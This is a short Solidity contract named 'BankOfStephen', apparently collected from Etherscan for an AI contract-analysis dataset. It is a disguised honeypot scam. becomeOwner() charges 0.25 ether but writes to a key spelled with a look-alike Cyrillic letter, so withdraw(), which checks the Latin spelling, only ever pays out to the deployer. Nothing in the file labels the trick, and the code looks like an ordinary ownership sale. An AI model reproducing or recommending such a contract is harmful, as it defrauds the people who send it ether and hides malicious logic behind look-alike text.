/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.24;

contract BankOfStephen{

mapping(bytes32 => address) private owner;

constructor() public{
    owner['Stephen'] = msg.sender;
}

function becomeOwner() public payable{
    require(msg.value >= 0.25 ether);        
    owner['Stephеn'] = msg.sender; 
}

function withdraw() public{
    require(owner['Stephen'] == msg.sender);
    msg.sender.transfer(address(this).balance);
}

function() public payable {}

}